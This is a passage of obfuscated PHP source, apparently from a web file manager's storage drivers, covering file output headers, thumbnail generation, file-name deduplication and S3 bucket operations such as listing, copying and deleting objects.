header($A½­éİ¬’¹[134]); goto D«™ÜŠ­¸; a“’™Ê…âœ: header($A½­éİ¬’¹[121]); header($A½­éİ¬’¹[122] . $C†¹·Ë°«); header($A½­éİ¬’¹[123] . gmdate($A½­éİ¬’¹[106], time() + 3600 * 24 * 30) . $A½­éİ¬’¹[124]); goto BÃÈ‹Éöß„; cåéµµ¿¥—: $C£ğÊ¢¾¥ = $this->getType() == $A½­éİ¬’¹[102]; $EàÎ¥Äğ†â = $GLOBALS[$A½­éİ¬’¹[6]][$A½­éİ¬’¹[84]][$A½­éİ¬’¹[103]][$A½­éİ¬’¹[104]]; $dá¨ßÒÒ¯ = (double) $GLOBALS[$A½­éİ¬’¹[6]][$A½­éİ¬’¹[84]][$A½­éİ¬’¹[103]][$A½­éİ¬’¹[105]] * 1024 * 1024; goto aº‘‘Ò‹Ê; BÙÓğ‰Ê‰˜: $C†¹·Ë°« = get_file_mime($càğ”ùš——); if (strstr($C†¹·Ë°«, $A½­éİ¬’¹[114])) { $C†¹·Ë°« = $C†¹·Ë°« . $A½­éİ¬’¹[115]; } if ($C÷Ì÷â¿Ïã === !1 && !mime_support($C†¹·Ë°«)) { $C÷Ì÷â¿Ïã = !0; $C†¹·Ë°« = $A½­éİ¬’¹[116]; } goto A‹ÛâÖ ŒÛ; A¬–³¢®Í: if ($_SERVER[$A½­éİ¬’¹[154]] == $A½­éİ¬’¹[155]) { return; } $C«Ã˜ˆ’ÃË = 1024 * 100; $AÕ™Ÿ¹´²ã = 0; goto f¸áóøÆïÕ; D›ŒÔ¶­’·: if (isset($_SERVER[$A½­éİ¬’¹[128]]) && strtotime($_SERVER[$A½­éİ¬’¹[128]]) == $F‘ãÖÄ¢ö–[$A½­éİ¬’¹[107]]) { header($A½­éİ¬’¹[129], !0, 304); die; } if (isset($_SERVER[$A½­éİ¬’¹[130]]) && $_SERVER[$A½­éİ¬’¹[130]] == $bÅ¥İ™ÅŒé) { header($A½­éİ¬’¹[131] . $bÅ¥İ™ÅŒé, !0, 304); die; } header($A½­éİ¬’¹[131] . $bÅ¥İ™ÅŒé); goto cåñ„‹ºé; CÊŠëÌÌÀ˜: if (in_array($càğ”ùš——, array($A½­éİ¬’¹[108], $A½­éİ¬’¹[109], $A½­éİ¬’¹[110], $A½­éİ¬’¹[111]))) { $càğ”ùš—— = $A½­éİ¬’¹[112]; } if (!$bÅ¥İ™ÅŒé) { $bÅ¥İ™ÅŒé = md5($f¼Æ÷“š¶ . $this->hashSimple($dÂ–Ó‰Ÿùº)); } $bÅ¥İ™ÅŒé = $A½­éİ¬’¹[113] . $bÅ¥İ™ÅŒé . $A½­éİ¬’¹[113]; goto BÙÓğ‰Ê‰˜; a‚çÉëÃ : $BÂ½ÛÍÑ† = $F‘ãÖÄ¢ö–[$A½­éİ¬’¹[77]]; $f¼Æ÷“š¶ = gmdate($A½­éİ¬’¹[106], $F‘ãÖÄ¢ö–[$A½­éİ¬’¹[107]]); $eÚ•„è¾ƒõ = $AõæÒ¨ß„¦ ? $AõæÒ¨ß„¦ : $this->iconvApp($F‘ãÖÄ¢ö–[$A½­éİ¬’¹[28]]); goto D‡¡³Ô®¼”; D«™ÜŠ­¸: header($A½­éİ¬’¹[135] . $BÂ½ÛÍÑ†); header($A½­éİ¬’¹[136]); if (!$C÷Ì÷â¿Ïã && $càğ”ùš—— == $A½­éİ¬’¹[137]) { if ($BÂ½ÛÍÑ† > 1024 * 1024 * 5) { die; } $C›á˜†©ˆÈ = $this->getContent($dÂ–Ó‰Ÿùº); $C›á˜†©ˆÈ = Html::clearSVG($C›á˜†©ˆÈ); header($A½­éİ¬’¹[138] . $BÂ½ÛÍÑ†); echo $C›á˜†©ˆÈ; die; } goto DÂò˜«¼‡Ÿ; AŒä–Œà³: } public function fileOutServer($F–ÃÜÖæÄ, $EíóìØã˜ = false, $E®¦´ß‹² = false, $Bœø …Óó = '') { $this->fileOut($F–ÃÜÖæÄ, $EíóìØã˜, $E®¦´ß‹², $Bœø …Óó); } public function fileOutLink($aÛˆà™’­’) { header($_SERVER[´Ù×Íå‘ÄõÛ][156] . $aÛˆà™’­’); die; } public function cacheMethod($FÀØ©¬¾µŠ, $Aß™¶¯ÏÅ) { goto E‰ÈŒ†ÁÉÌ; F¯ì†¿†»: $bâ…Œƒ‹†Š = isset($DÅÈ½‘æ‰[$FÒ¿À œèÑ]) ? $DÅÈ½‘æ‰[$FÒ¿À œèÑ] : null; if (!is_null($bâ…Œƒ‹†Š)) { return $bâ…Œƒ‹†Š; } $bâ…Œƒ‹†Š = $this->{$FÀØ©¬¾µŠ}($Aß™¶¯ÏÅ); goto Bî˜¡£ãÒŠ; Bî˜¡£ãÒŠ: $DÅÈ½‘æ‰[$FÒ¿À œèÑ] = $bâ…Œƒ‹†Š; return $bâ…Œƒ‹†Š; goto eá‹½Ãíª; eÁäŠ©Óë: $FÒ¿À œèÑ = $Dµ“ø×¯¿•[157] . $FÀØ©¬¾µŠ . $Dµ“ø×¯¿•[158] . rtrim($D¡”Š¨õ•à, $Dµ“ø×¯¿•[8]); if (is_null($FÀØ©¬¾µŠ)) { $DÅÈ½‘æ‰ = array(); return; } if (is_null($Aß™¶¯ÏÅ)) { unset($DÅÈ½‘æ‰[$FÒ¿À œèÑ]); return; } goto F¯ì†¿†»; E‰ÈŒ†ÁÉÌ: $Dµ“ø×¯¿• =& $_SERVER[´Ù×Íå‘ÄõÛ]; static $DÅÈ½‘æ‰ = array(); $D¡”Š¨õ•à = $Aß™¶¯ÏÅ ? ltrim($this->getPathOuter($Aß™¶¯ÏÅ), $Dµ“ø×¯¿•[8]) : $Aß™¶¯ÏÅ; goto eÁäŠ©Óë; eá‹½Ãíª: } public function fileOutImage($F ½ôÔÅ™ , $aªòß¾öÓ§ = 250) { goto B¬Õ¯ç•ë; b¤¨ØÃ Ù: if (!($E×µÏ™œæ˜ = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $bÁ¾ »³¶Ü[165]))) { $Aêø°õŒ© = IO::mkdir(IO_PATH_SYSTEM_TEMP . $bÁ¾ »³¶Ü[166]); } else { $Aêø°õŒ© = KodIO::make($E×µÏ™œæ˜); } if ($E×µÏ™œæ˜ = IO::fileNameExist($Aêø°õŒ©, $d¶ö¬¦¤“ã)) { $d‰…¸Ñæâ = KodIO::make($E×µÏ™œæ˜); return IO::fileOut($d‰…¸Ñæâ); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } goto Fìâ– áï; B¬Õ¯ç•ë: $bÁ¾ »³¶Ü =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (substr($F ½ôÔÅ™ , 0, 4) == $bÁ¾ »³¶Ü[144]) { $this->fileOutLink($F ½ôÔÅ™ ); } $aÑ‹º îùë = $this->info($F ½ôÔÅ™ ); goto E‰ªáĞÄê; Fìâ– áï: $d‰…¸Ñæâ = DATA_THUMB . $d¶ö¬¦¤“ã; if (!@file_exists($d‰…¸Ñæâ)) { $fÕñ…¶ÉŞï = TEMP_FILES; if (!is_dir($fÕñ…¶ÉŞï)) { mk_dir($fÕñ…¶ÉŞï); } $c„¼…†¦îÉ = $fÕñ…¶ÉŞï . $d¡œ´Œ¿¡ . $bÁ¾ »³¶Ü[91] . $aÑ‹º îùë[$bÁ¾ »³¶Ü[160]]; if (!@file_exists($c„¼…†¦îÉ)) { $c„¼…†¦îÉ = $this->download($F ½ôÔÅ™ , $c„¼…†¦îÉ); } $Dß± °½Á = new ImageThumb($c„¼…†¦îÉ, $bÁ¾ »³¶Ü[167]); $Dß± °½Á->prorate($d‰…¸Ñæâ, $aªòß¾öÓ§, $aªòß¾öÓ§ * 10); } if (!file_exists($d‰…¸Ñæâ) || filesize($d‰…¸Ñæâ) < 100) { return @file_exists($c„¼…†¦îÉ) ? IO::fileOut($c„¼…†¦îÉ) : $this->fileOut($F ½ôÔÅ™ ); } goto F¯±îáä×‹; F¯±îáä×‹: if (!($C‹›±¶‘Ì = IO::move($d‰…¸Ñæâ, $Aêø°õŒ©))) { return IO::fileOut($d‰…¸Ñæâ); } del_file($d‰…¸Ñæâ); IO::fileOut($C‹›±¶‘Ì); goto dÓˆïİ˜áÉ; E‰ªáĞÄê: if ($aÑ‹º îùë[$bÁ¾ »³¶Ü[77]] <= 1024 * 50 || !function_exists($bÁ¾ »³¶Ü[159]) || $aÑ‹º îùë[$bÁ¾ »³¶Ü[160]] == $bÁ¾ »³¶Ü[161]) { return $this->fileOut($F ½ôÔÅ™ ); } if (isset($aÑ‹º îùë[$bÁ¾ »³¶Ü[162]][$bÁ¾ »³¶Ü[163]])) { $d¡œ´Œ¿¡ = $aÑ‹º îùë[$bÁ¾ »³¶Ü[162]][$bÁ¾ »³¶Ü[163]]; } else { if (isset($aÑ‹º îùë[$bÁ¾ »³¶Ü[162]][$bÁ¾ »³¶Ü[164]])) { $d¡œ´Œ¿¡ = $aÑ‹º îùë[$bÁ¾ »³¶Ü[162]][$bÁ¾ »³¶Ü[164]]; } else { $d¡œ´Œ¿¡ = md5("{$aÑ‹º îùë[$bÁ¾ »³¶Ü[28]]}\x5f{$aÑ‹º îùë[$bÁ¾ »³¶Ü[75]]}\137{$aÑ‹º îùë[$bÁ¾ »³¶Ü[77]]}"); } } $d¶ö¬¦¤“ã = "{$d¡œ´Œ¿¡}\x5f{$aªòß¾öÓ§}\56\x70\156\x67"; goto b¤¨ØÃ Ù; dÓˆïİ˜áÉ: } public function fileOutImageServer($B„—–õî…ø, $CïĞõã¦Ë¥ = 250) { $this->fileOutImage($B„—–õî…ø, $CïĞõã¦Ë¥); } public function fileNameAuto($a†¾øÂ¥æÃ, $F×æğáõ, $eî½øèƒÉ = REPEAT_RENAME, $c‚Ä…¥¯„ = false) { goto bœŠÜò’ªÎ; bœŠÜò’ªÎ: $B¨î§ÈÑ“Ï =& $_SERVER[´Ù×Íå‘ÄõÛ]; $AÑíÖ‚¾ĞÁ = $a†¾øÂ¥æÃ === $B¨î§ÈÑ“Ï[33] ? $F×æğáõ : rtrim($a†¾øÂ¥æÃ, $B¨î§ÈÑ“Ï[8]) . $B¨î§ÈÑ“Ï[8] . $F×æğáõ; if ($eî½øèƒÉ == REPEAT_REPLACE || !$this->exist($AÑíÖ‚¾ĞÁ) || $c‚Ä…¥¯„ && $eî½øèƒÉ != REPEAT_RENAME_FOLDER) { return $F×æğáõ; } goto cÄÓÆØ®‘; Fô³ÖÌßˆë: while ($this->exist(rtrim($a†¾øÂ¥æÃ, $B¨î§ÈÑ“Ï[8]) . $B¨î§ÈÑ“Ï[8] . $f²ˆã¶¸óÈ)) { $f²ˆã¶¸óÈ = $dæĞÜõñ¢ . "\x28{$a¢¤é§ˆ‘’}\x29{$få¤©±º˜}"; $a¢¤é§ˆ‘’++; } return $f²ˆã¶¸óÈ; goto FÊì–Š°°Í; cÄÓÆØ®‘: if ($eî½øèƒÉ == REPEAT_SKIP) { return !1; } $få¤©±º˜ = $B¨î§ÈÑ“Ï[91] . get_path_ext($F×æğáõ); $få¤©±º˜ = $få¤©±º˜ == $B¨î§ÈÑ“Ï[91] || $c‚Ä…¥¯„ ? $B¨î§ÈÑ“Ï[33] : $få¤©±º˜; goto bìå§„áÓ¢; bìå§„áÓ¢: $a¢¤é§ˆ‘’ = 1; $dæĞÜõñ¢ = substr($F×æğáõ, 0, strlen($F×æğáõ) - strlen($få¤©±º˜)); $f²ˆã¶¸óÈ = $dæĞÜõñ¢ . "\x28{$a¢¤é§ˆ‘’}\51{$få¤©±º˜}"; goto Fô³ÖÌßˆë; FÊì–Š°°Í: } public function listAllFiles($AÅ¡ëÎ¿­, $Cèî„À„ÄÁ, $C„¨ØÊœ¿¢ = array()) { goto aì˜¢ŞìğÒ; Cœª¶¹çàÓ: $AÅ¡ëÎ¿­ = trim($AÅ¡ëÎ¿­, $eâ‡ìÙ°›È[8]); foreach ($Cèî„À„ÄÁ as $FÒÊ„Œší) { $dÄ¹ò¢©Íô = ltrim(substr($FÒÊ„Œší, strlen($AÅ¡ëÎ¿­)), $eâ‡ìÙ°›È[8]); $E¯¦í¥Œ¶” = array_merge($E¯¦í¥Œ¶”, $this->slicePath($dÄ¹ò¢©Íô)); } $F¼³Ÿ”Ğ‰ = array(); goto F—ÑŠàŸí‹; F—ÑŠàŸí‹: foreach (array_unique($E¯¦í¥Œ¶”) as $FÒÊ„Œší) { $AŸ‚ŠŠã‹… = array($eâ‡ìÙ°›È[75] => $this->getPathOuter($eâ‡ìÙ°›È[8] . $AÅ¡ëÎ¿­ . $eâ‡ìÙ°›È[8] . $FÒÊ„Œší), $eâ‡ìÙ°›È[76] => 1, $eâ‡ìÙ°›È[77] => 0); if (substr($FÒÊ„Œší, -1) != $eâ‡ìÙ°›È[8]) { $AŸ‚ŠŠã‹…[$eâ‡ìÙ°›È[76]] = 0; $e¥¹¯Š¶Ğğ = $this->getPath($AÅ¡ëÎ¿­ . $eâ‡ìÙ°›È[8] . $FÒÊ„Œší); $AŸ‚ŠŠã‹…[$eâ‡ìÙ°›È[77]] = isset($C„¨ØÊœ¿¢[$e¥¹¯Š¶Ğğ]) ? $C„¨ØÊœ¿¢[$e¥¹¯Š¶Ğğ] : $this->size($e¥¹¯Š¶Ğğ); } $F¼³Ÿ”Ğ‰[] = $AŸ‚ŠŠã‹…; } return $F¼³Ÿ”Ğ‰; goto D†ÕÑõğñĞ; aì˜¢ŞìğÒ: $eâ‡ìÙ°›È =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (empty($Cèî„À„ÄÁ)) { return array(); } $E¯¦í¥Œ¶” = array(); goto Cœª¶¹çàÓ; D†ÕÑõğñĞ: } public function slicePath($CõÊ–×„Á) { $eßÉ‘«ù =& $_SERVER[´Ù×Íå‘ÄõÛ]; $f½»¦Àœ = explode($eßÉ‘«ù[8], trim($CõÊ–×„Á, $eßÉ‘«ù[8])); $BÉ—¨÷ğ = 0; do { ++$BÉ—¨÷ğ; $B«§« ™§·[] = implode($eßÉ‘«ù[8], array_slice($f½»¦Àœ, 0, $BÉ—¨÷ğ)) . $eßÉ‘«ù[8]; } while ($BÉ—¨÷ğ < count($f½»¦Àœ)); $B«§« ™§·[count($f½»¦Àœ) - 1] = $CõÊ–×„Á; return $B«§« ™§·; } public function getHost() { $eÊ³‚ ö“ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $C¶îŸ±±ø¾ = parse_url(trim($this->domain, $eÊ³‚ ö“[8])); $FØêËêØ³À = isset($C¶îŸ±±ø¾[$eÊ³‚ ö“[168]]) ? $C¶îŸ±±ø¾[$eÊ³‚ ö“[168]] : http_type(); $fëÍâœ²… = isset($C¶îŸ±±ø¾[$eÊ³‚ ö“[169]]) ? $C¶îŸ±±ø¾[$eÊ³‚ ö“[169]] : $C¶îŸ±±ø¾[$eÊ³‚ ö“[75]]; if (isset($C¶îŸ±±ø¾[$eÊ³‚ ö“[170]])) { $fëÍâœ²… .= $eÊ³‚ ö“[4] . $C¶îŸ±±ø¾[$eÊ³‚ ö“[170]]; } return $FØêËêØ³À . $eÊ³‚ ö“[171] . $fëÍâœ²…; } public function pathEncode($cØ±ÚáÄÊ¦) { $cË…öˆØ½Ä =& $_SERVER[´Ù×Íå‘ÄõÛ]; return str_replace($cË…öˆØ½Ä[172], $cË…öˆØ½Ä[8], rawurlencode($cØ±ÚáÄÊ¦)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\x34"; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public function __construct($c®Œî‡») { set_timeout(); require_once SDK_DIR . $_SERVER[´Ù×Íå‘ÄõÛ][173]; parent::__construct(); $this->_init($c®Œî‡»); } public function _init($cñ”í¤„®Ò) { foreach ($cñ”í¤„®Ò as $fáÅÇ¾•Ø => $D…¥­²ù¯) { if (isset($this->{$fáÅÇ¾•Ø})) { $this->{$fáÅÇ¾•Ø} = $D…¥­²ù¯; } } $this->endpoint = $cñ”í¤„®Ò[$_SERVER[´Ù×Íå‘ÄõÛ][174]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($a¬ÁÕ®öè = "\166\64") { $this->signVer = $a¬ÁÕ®öè; $this->client->setSignatureVersion($a¬ÁÕ®öè); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { goto DÔ†ÑÊöÇÒ; CÊÈ¤´õ»à: if ($A¯Éİù›—‰[$e¬Ë›•©×[175]] != $e¬Ë›•©×[176] || $A¯Éİù›—‰[$e¬Ë›•©×[177]] != $e¬Ë›•©×[176]) { return !1; } $CŞ©ÏÓ£ = array_map($e¬Ë›•©×[178], $A¯Éİù›—‰[$e¬Ë›•©×[179]]); if (!is_array($CŞ©ÏÓ£)) { $CŞ©ÏÓ£ = array(); } goto Aë…¬ÆÒ¿¼; Aë…¬ÆÒ¿¼: $a…–†íİ´‰ = array($e¬Ë›•©×[180], $e¬Ë›•©×[181], $e¬Ë›•©×[182], $e¬Ë›•©×[183], $e¬Ë›•©×[184]); $Aë¸ÁİŠÕ = array_diff($a…–†íİ´‰, $CŞ©ÏÓ£); return empty($Aë¸ÁİŠÕ); goto a©ˆ¤Éï; DÔ†ÑÊöÇÒ: $e¬Ë›•©× =& $_SERVER[´Ù×Íå‘ÄõÛ]; $A¯Éİù›—‰ = $this->getBucketCors(); if (!$A¯Éİù›—‰ || !is_array($A¯Éİù›—‰)) { return !1; } goto CÊÈ¤´õ»à; a©ˆ¤Éï: } public function mkfile($D•öô±çå, $bî©²‡¤ëâ = '', $fíåĞ¿™Ë = REPEAT_RENAME) { $Bïˆ¯°®Á‚ = $this->setContent($D•öô±çå, $bî©²‡¤ëâ); if ($Bïˆ¯°®Á‚ !== !1) { return $this->getPathOuter($D•öô±çå); } return !1; } public function mkdir($b è¸¥¨Òî, $AÀˆÉÁ¶  = REPEAT_SKIP) { if (empty($b è¸¥¨Òî)) { return !1; } if ($this->_isFolder($b è¸¥¨Òî)) { return $this->getPathOuter($b è¸¥¨Òî); } $FĞ¤¼·£ï = $this->setContent($b è¸¥¨Òî, $_SERVER[´Ù×Íå‘ÄõÛ][33], !0); if ($FĞ¤¼·£ï !== !1) { return $this->getPathOuter($b è¸¥¨Òî); } return !1; } public function copyFile($f»Ñ«Ä«’, $dÁÎ½ˆ‰œ×, $cáî·¯‡Èó = array()) { $cˆøËØÁ¤Æ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $e†–º¤Èƒ = $this->objectMeta($f»Ñ«Ä«’); if (!$e†–º¤Èƒ) { return !1; } if ($e†–º¤Èƒ[$cˆøËØÁ¤Æ[77]] <= 1024 * 1024 * 200) { $eÚ‚ïÄîÊ¾ = $this->client->copyObject($this->bucket, $f»Ñ«Ä«’, $this->bucket, $dÁÎ½ˆ‰œ×, $cˆøËØÁ¤Æ[185], $cáî·¯‡Èó); } else { $eÚ‚ïÄîÊ¾ = $this->client->multiCopyObject($this->bucket, $f»Ñ«Ä«’, $this->bucket, $dÁÎ½ˆ‰œ×, $cáî·¯‡Èó); } $eÚ‚ïÄîÊ¾ = $eÚ‚ïÄîÊ¾ ? $this->getPathOuter($dÁÎ½ˆ‰œ×) : !1; return $eÚ‚ïÄîÊ¾; } public function moveFile($Aëß×Ãİ¿, $aÊ¢ã¡çİ—) { if ($this->copyFile($Aëß×Ãİ¿, $aÊ¢ã¡çİ—)) { $this->delFile($Aëß×Ãİ¿); return $this->getPathOuter($aÊ¢ã¡çİ—); } return !1; } public function delFile($cÍ›·íÌø·) { return $this->client->deleteObject($this->bucket, $cÍ›·íÌø·); } public function delFolder($BŠêÍ¸Á ô) { goto eëİÙâÛöµ; E’ç­ßíŠ: return $C²´‰ƒ¦àÕ === $e»³•Ñ·Á« ? !0 : !1; goto c¦²³¿“İá; eëİÙâÛöµ: $BØŞÌõùÚ† =& $_SERVER[´Ù×Íå‘ÄõÛ]; $c„–¼½İ„¢ = $this->listObjs($BŠêÍ¸Á ô); if (!$c„–¼½İ„¢) { $BŠêÍ¸Á ô = trim($BŠêÍ¸Á ô, $BØŞÌõùÚ†[8]); if (!empty($BŠêÍ¸Á ô)) { $BŠêÍ¸Á ô .= $BØŞÌõùÚ†[8]; } return $this->delFile($BŠêÍ¸Á ô); } goto BÁ’ÕÖÃÛ¤; BÁ’ÕÖÃÛ¤: $C²´‰ƒ¦àÕ = $e»³•Ñ·Á« = 0; $eíÓ²ñÊ¹… = array_chunk(array_keys($c„–¼½İ„¢), 1000); foreach ($eíÓ²ñÊ¹… as $eù‰Ú‰³Ë¯) { $C²´‰ƒ¦àÕ++; $e»³•Ñ·Á« += (int) $this->client->deleteObjects($this->bucket, $eù‰Ú‰³Ë¯); } goto E’ç­ßíŠ; c¦²³¿“İá: } public function rename($A‡‚‡…§’Ğ, $CµŠ˜İ™) { return $this->renameObject($A‡‚‡…§’Ğ, $CµŠ˜İ™); } public function listPath($DºíŠÉ²Ü”, $DŠ‘»®¸Š¤ = false) { $eÜù“©Ÿß¨ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $f½˜Í²ÕæÜ = $this->listObjs($DºíŠÉ²Ü”, null, null, $eÜù“©Ÿß¨[8]); $d…²Æ¥‚¾ = array($eÜù“©Ÿß¨[74] => array(), $eÜù“©Ÿß¨[73] => array()); foreach ($f½˜Í²ÕæÜ as $f°ĞÑø‰¸ => $B„Ó¬¹ö”) { if ($f°ĞÑø‰¸ == $eÜù“©Ÿß¨[8]) { continue; } if (isset($B„Ó¬¹ö”[$eÜù“©Ÿß¨[186]])) { $d…²Æ¥‚¾[$eÜù“©Ÿß¨[74]][] = $this->folderInfo($B„Ó¬¹ö”[$eÜù“©Ÿß¨[186]], $DŠ‘»®¸Š¤); } else { if (substr($B„Ó¬¹ö”[$eÜù“©Ÿß¨[28]], -1) == $eÜù“©Ÿß¨[8]) { continue; } $d…²Æ¥‚¾[$eÜù“©Ÿß¨[73]][] = $this->fileInfo($B„Ó¬¹ö”[$eÜù“©Ÿß¨[28]], $DŠ‘»®¸Š¤, $B„Ó¬¹ö”); } } return $d…²Æ¥‚¾; } private function fileInfo($DâÄÕ—‹ˆç, $eí‡¢ßï»• = false, $FŠäÀ½³° = array()) { goto fïâÎÒ; Bá¸È²: if (empty($FŠäÀ½³°)) { $FŠäÀ½³° = $this->objectMeta($DâÄÕ—‹ˆç); if (!$FŠäÀ½³°) { return $A‚»‡ˆ½—ï; } } if (isset($FŠäÀ½³°[$Dä·ŞÀ¾¢Ú[190]])) { $A‚»‡ˆ½—ï[$Dä·ŞÀ¾¢Ú[107]] = $FŠäÀ½³°[$Dä·ŞÀ¾¢Ú[190]]; } if (isset($FŠäÀ½³°[$Dä·ŞÀ¾¢Ú[77]])) { $A‚»‡ˆ½—ï[$Dä·ŞÀ¾¢Ú[77]] = $FŠäÀ½³°[$Dä·ŞÀ¾¢Ú[77]]; } goto Câß™ùìÛ¹; fïâÎÒ: $Dä·ŞÀ¾¢Ú =& $_SERVER[´Ù×Íå‘ÄõÛ]; if ($eí‡¢ßï»•) { return array($Dä·ŞÀ¾¢Ú[28] => $this->pathThis($DâÄÕ—‹ˆç), $Dä·ŞÀ¾¢Ú[75] => $this->getPathOuter($DâÄÕ—‹ˆç), $Dä·ŞÀ¾¢Ú[29] => $Dä·ŞÀ¾¢Ú[167], $Dä·ŞÀ¾¢Ú[160] => $this->ext($DâÄÕ—‹ˆç), $Dä·ŞÀ¾¢Ú[77] => isset($FŠäÀ½³°[$Dä·ŞÀ¾¢Ú[77]]) ? $FŠäÀ½³°[$Dä·ŞÀ¾¢Ú[77]] : 0, $Dä·ŞÀ¾¢Ú[187] => 0, $Dä·ŞÀ¾¢Ú[107] => 0, $Dä·ŞÀ¾¢Ú[188] => !0, $Dä·ŞÀ¾¢Ú[189] => !0); } $A‚»‡ˆ½—ï = array($Dä·ŞÀ¾¢Ú[28] => $this->pathThis($DâÄÕ—‹ˆç), $Dä·ŞÀ¾¢Ú[75] => $this->getPathOuter($DâÄÕ—‹ˆç), $Dä·ŞÀ¾¢Ú[29] => $Dä·ŞÀ¾¢Ú[167], $Dä·ŞÀ¾¢Ú[187] => 0, $Dä·ŞÀ¾¢Ú[107] => 0, $Dä·ŞÀ¾¢Ú[77] => 0, $Dä·ŞÀ¾¢Ú[160] => $this->ext($DâÄÕ—‹ˆç), $Dä·ŞÀ¾¢Ú[188] => !0, $Dä·ŞÀ¾¢Ú[189] => !0); goto Bá¸È²; Câß™ùìÛ¹: return $A‚»‡ˆ½—ï; goto BŠÑ§ƒŠÈ; BŠÑ§ƒŠÈ: } private function folderInfo($eİ—©ËµÃâ, $a½¯¼Ø˜– = false) { goto B‡Ò†âê; B™ø¡†âˆÉ: if ($eİ—©ËµÃâ == $cÊ¨Ğ›»á[33]) { return $aÎ»‚“ìßâ; } $eİ—©ËµÃâ = trim($eİ—©ËµÃâ, $cÊ¨Ğ›»á[8]) . $cÊ¨Ğ›»á[8]; $e¡È‡…´Á¥ = $this->objectMeta($eİ—©ËµÃâ); goto F´ŞÂ®‘¡ˆ; F´ŞÂ®‘¡ˆ: if (isset($e¡È‡…´Á¥[$cÊ¨Ğ›»á[190]])) { $aÎ»‚“ìßâ[$cÊ¨Ğ›»á[187]] = $e¡È‡…´Á¥[$cÊ¨Ğ›»á[190]]; } return $aÎ»‚“ìßâ; goto A·‡œ‰ĞÔ; B‡Ò†âê: $cÊ¨Ğ›»á =& $_SERVER[´Ù×Íå‘ÄõÛ]; if ($a½¯¼Ø˜–) { return array($cÊ¨Ğ›»á[28] => $this->pathThis($eİ—©ËµÃâ), $cÊ¨Ğ›»á[75] => $this->getPathOuter($cÊ¨Ğ›»á[8] . $eİ—©ËµÃâ), $cÊ¨Ğ›»á[29] => $cÊ¨Ğ›»á[76], $cÊ¨Ğ›»á[188] => !0, $cÊ¨Ğ›»á[189] => !0); } $aÎ»‚“ìßâ = array($cÊ¨Ğ›»á[28] => $this->pathThis($eİ—©ËµÃâ), $cÊ¨Ğ›»á[75] => $this->getPathOuter($cÊ¨Ğ›»á[8] . $eİ—©ËµÃâ), $cÊ¨Ğ›»á[29] => $cÊ¨Ğ›»á[76], $cÊ¨Ğ›»á[187] => 0, $cÊ¨Ğ›»á[107] => 0, $cÊ¨Ğ›»á[188] => !0, $cÊ¨Ğ›»á[189] => !0); goto B™ø¡†âˆÉ; A·‡œ‰ĞÔ: } public function listObjs($c°ŠãŸ†¶À, $f…àª’ÙŞ = null, $B™İŸ˜ƒ§Ù = null, $d°Óèô¶ = null) { $f¯¡‘Ü¹¨Ì =& $_SERVER[´Ù×Íå‘ÄõÛ]; $c°ŠãŸ†¶À = trim($c°ŠãŸ†¶À, $f¯¡‘Ü¹¨Ì[8]); $bâ¾µ•À® = empty($c°ŠãŸ†¶À) ? $f¯¡‘Ü¹¨Ì[33] : $c°ŠãŸ†¶À . $f¯¡‘Ü¹¨Ì[8]; return $this->client->getBucket($this->bucket, $bâ¾µ•À®, $f…àª’ÙŞ, $B™İŸ˜ƒ§Ù, $d°Óèô¶, !0); } public function has($BÔÌ®È¬¿ª, $d×èÙäƒŒÂ = false, $eíˆÄ“¹ô = true) { goto aêóİ¶ùô­; aêóİ¶ùô­: $cÇˆ¬ÜÎ„è =& $_SERVER[´Ù×Íå‘ÄõÛ]; $FÄçä´ÇÕ÷ = 0; $AÚ……ÒÍç¦ = 0; goto B«æõŸíƒ; aÚÓë¤Ç‹: if ($d×èÙäƒŒÂ) { return array($cÇˆ¬ÜÎ„è[191] => $FÄçä´ÇÕ÷, $cÇˆ¬ÜÎ„è[192] => $AÚ……ÒÍç¦); } return !1; goto D–ä»†‰±Ô; B«æõŸíƒ: $e£»Ÿ‡Ø™ = $this->listObjs($BÔÌ®È¬¿ª, null, null, $cÇˆ¬ÜÎ„è[8]); $e£»Ÿ‡Ø™ = is_array($e£»Ÿ‡Ø™) ? $e£»Ÿ‡Ø™ : array(); foreach ($e£»Ÿ‡Ø™ as $Eó‡‹Š¹÷) { if (isset($Eó‡‹Š¹÷[$cÇˆ¬ÜÎ„è[28]]) && substr($Eó‡‹Š¹÷[$cÇˆ¬ÜÎ„è[28]], -1) != $cÇˆ¬ÜÎ„è[8]) { if (!$d×èÙäƒŒÂ && $eíˆÄ“¹ô) { return !0; } $FÄçä´ÇÕ÷++; } else { if (isset($Eó‡‹Š¹÷[$cÇˆ¬ÜÎ„è[186]])) { if (!$d×èÙäƒŒÂ && !$eíˆÄ“¹ô) { return !1; } $AÚ……ÒÍç¦++; } } } goto aÚÓë¤Ç‹; D–ä»†‰±Ô: } public function listAll($Dîù¼ŞŸÀ‰) { $E½Ë‹ã×Øî =& $_SERVER[´Ù×Íå‘ÄõÛ]; $aÏ‚ù¶†œ´ = $this->listObjs($Dîù¼ŞŸÀ‰); $A¹Áï†„Çæ = $f…³½ˆ»œî = array(); foreach ($aÏ‚ù¶†œ´ as $eãóĞŠ¶ÛÇ => $dñºùË°¥„) { $A¹Áï†„Çæ[] = $dñºùË°¥„[$E½Ë‹ã×Øî[28]]; $f…³½ˆ»œî[$eãóĞŠ¶ÛÇ] = $dñºùË°¥„[$E½Ë‹ã×Øî[77]]; } return $this->listAllFiles($Dîù¼ŞŸÀ‰, $A¹Áï†„Çæ, $f…³½ˆ»œî); } public function canRead($B‰æ´‰ò) { $f¿ÜØÌ›é =& $_SERVER[´Ù×Íå‘ÄõÛ]; $AøĞó÷Œº¹ = $this->client->getAccessControlPolicy($this->bucket, $B‰æ´‰ò); if (!$AøĞó÷Œº¹) { return !1; } 